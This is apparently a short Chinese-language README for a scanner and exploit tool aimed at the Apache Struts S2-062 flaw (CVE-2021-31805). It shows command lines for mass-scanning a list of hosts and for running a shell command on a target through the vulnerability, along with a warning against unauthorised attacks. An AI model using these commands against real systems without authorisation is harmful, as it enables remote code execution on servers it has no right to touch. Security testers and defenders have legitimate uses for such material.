# S2-062
CVE-2021-31805/s2-062 批量扫描及漏洞利用

请遵守法律法规，禁止未授权攻击网站系统

# 使用说明
## 批量扫描模式
```
python3 CVE-2021-31805.py -m scan -f 123.txt
```
![scan_mode](scan.jpg)

## 命令执行模式
```
python3 CVE-2021-31805.py -u https://xxx.xxx.com:8080 -c id
```
![rce_mode](rce.jpg)
